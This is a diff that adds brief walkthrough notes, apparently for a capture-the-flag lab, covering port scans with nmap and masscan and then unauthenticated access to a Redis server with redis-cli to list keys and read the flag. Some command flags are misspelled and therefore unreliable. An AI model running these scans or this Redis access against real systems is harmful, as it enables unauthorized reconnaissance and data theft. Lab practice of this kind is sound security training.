@@ -1,0 +1,8 @@
+1. apply scan nmap -sS -sV -sC -p- -vvv -oN scan_red <IP in this case>
+2. long time, apply msscan -p1-65535 10.129.47.33 -inte=1000 -e tun0
+3. downloading redis-cli
+4. typing redis-cli -h <IP in this case> -p 6379 (for defect)
+5. apply info
+6. next-> keys *
+7. for last -> get flag
+8. type quit
